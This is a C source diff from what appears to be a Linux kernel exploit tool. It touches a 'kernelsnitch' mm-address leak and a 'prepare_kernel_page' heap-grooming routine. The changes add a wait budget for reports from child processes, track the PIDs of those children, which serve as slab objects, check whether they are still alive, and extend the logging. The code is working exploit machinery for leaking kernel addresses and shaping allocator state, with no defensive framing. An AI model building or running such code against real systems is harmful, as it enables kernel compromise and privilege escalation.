@@ -63,10 +63,14 @@ static pid_t child_leak;
  * serialized on the freeing CPU: one at a time, ~8-10 minutes each. */
 static int ks_id_dumps;
 static int dump_pipe_count;
+/* One wait budget per slot.  kp_dump_read_report() enforces it as a total, not
+ * as a count of poll() timeouts. */
+#define KS_ID_DUMP_WAIT_MS 900000
 /* The report's terminal-state value must track the scan's own enum. */
 _Static_assert(KP_DUMP_STATE_MM_FOUND == KERNELSNITCH_MM_FOUND,
                "KP_DUMP_STATE_MM_FOUND must mirror kernelsnitch_state");
 static int dump_fd[64][4]; /* start[0], start[1], report[0], report[1] */
+static pid_t dump_pid[64];  /* the reporting child, which is also the object */
 static uintptr_t dump_addr[64];
 static uintptr_t cached_leaked_mm;
 /* Set when a preparation attempt died in collision finding or the mm leak.
@@ -1448,10 +1452,17 @@ static pid_t clone_dump_slot(size_t slot) {
       char line[64];
       int n = snprintf(line, sizeof(line), "mm=%016zx accepted=%zu state=%d\n",
                        (size_t)mm, (size_t)ks->accepted_count, (int)ks->state);
+      ssize_t w = -1;
       if (n > 0 && (size_t)n < sizeof(line)) {
-        ssize_t w = write(dump_fd[i][3], line, (size_t)n);
-        (void)w;
+        w = write(dump_fd[i][3], line, (size_t)n);
       }
+      /* The report is complete before any cleanup runs, so a failed release
+       * can never change what was reported.  The parent's admission is a
+       * separate outcome (KS_ID_DUMP verdict=...). */
+      pr_info("KS_ID_DUMP_REPORT slot=%zu accepted=%zu state=%d result=%s\n",
+              slot, (size_t)ks->accepted_count, (int)ks->state,
+              (n > 0 && (size_t)n < sizeof(line) && w == n) ? "written"
+                                                            : "write-failed");
     }
     close(dump_fd[i][3]);
     /* Release the scan's mappings before parking.  The child must stay alive
@@ -1495,30 +1506,13 @@ static void collect_dump_addresses(struct kp_geometry *geo) {
       dump_fd[i][1] = -1;
     }
     char line[64];
-    size_t used = 0;
-    for (int waited = 0; waited < 900; waited++) {
-      struct pollfd p;
-      p.fd = dump_fd[i][2];
-      p.events = POLLIN;
-      p.revents = 0;
-      int pr = poll(&p, 1, 1000);
-      if (pr > 0 && (p.revents & (POLLIN | POLLHUP))) {
-        ssize_t n = read(dump_fd[i][2], line + used,
-                         sizeof(line) - 1 - used);
-        if (n > 0) {
-          used += (size_t)n;
-          if (memchr(line, '\n', used) != NULL) {
-            break;
-          }
-        } else if (n == 0) {
-          break;
-        }
-      } else if (pr < 0 && errno != EINTR) {
-        break;
-      }
-    }
-    close(dump_fd[i][2]);
+    /* The reader closes the report pipe on every path - a full line, EOF, a
+     * partial line or the deadline - so a child that never answers leaves no
+     * descriptor behind and open_pipes stays zero. */
+    ssize_t got = kp_dump_read_report(dump_fd[i][2], line, sizeof(line),
+                                      KS_ID_DUMP_WAIT_MS);
     dump_fd[i][2] = -1;
+    size_t used = got > 0 ? (size_t)got : 0;
     line[used] = 0;
     /* The report is the unit: kp_dump_admit() refuses a child that did not
      * report, a truncated line, a malformed line, a scan that ended without an
@@ -1542,6 +1536,25 @@ static void collect_dump_addresses(struct kp_geometry *geo) {
     }
   }
   {
+    /* A report is only half the claim: the child that wrote it must still hold
+     * its mm slot.  A child that died (assert in cleanup, kill, OOM) has
+     * already freed the object, so the row's freeze state would be false.  Only
+     * a dead child is reaped here; a live one is the slab object itself. */
+    int alive = 0;
+    int gone = 0;
+    for (int i = 0; i < dump_pipe_count; i++) {
+      int st = dump_pid[i] > 0 ? task_state_char(dump_pid[i]) : 0;
+      int live = st != 0 && st != 'Z' && st != 'X';
+      alive += live ? 1 : 0;
+      if (!live) {
+        gone++;
+        if (dump_pid[i] > 0) {
+          (void)waitpid(dump_pid[i], NULL, WNOHANG);
+        }
+      }
+      pr_info("KS_ID_DUMP_ALIVE slot=%d pid=%d state=%c alive=%d\n", i + 1,
+              (int)dump_pid[i], st != 0 ? st : '?', live);
+    }
     int open = 0;
     for (int i = 0; i < dump_pipe_count; i++) {
       for (int j = 0; j < 4; j++) {
@@ -1550,10 +1563,10 @@ static void collect_dump_addresses(struct kp_geometry *geo) {
         }
       }
     }
-    pr_info("KS_ID_DUMP_DONE slots=%d reported=%d rejected=%d open_pipes=%d "
-            "total_ms=%.0f\n",
-            dump_pipe_count, reported, dump_pipe_count - reported, open,
-            ks_now_ms() - t0);
+    pr_info("KS_ID_DUMP_DONE slots=%d reported=%d rejected=%d alive=%d gone=%d "
+            "open_pipes=%d total_ms=%.0f\n",
+            dump_pipe_count, reported, dump_pipe_count - reported, alive, gone,
+            open, ks_now_ms() - t0);
   }
 }
 
@@ -2624,6 +2637,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
                                             ? EMPTYING_CPU
                                             : CORE);
         if (c <= 0) break;
+        if (dump_slot) {
+          dump_pid[pre_n - 1] = c;
+        }
         (void)ks_buddy_capture();
         pre_ctx.childs[pre_n] = c;
         pre_slots[pre_n] = dump_slot ? -1 : pin_slot_of_last;
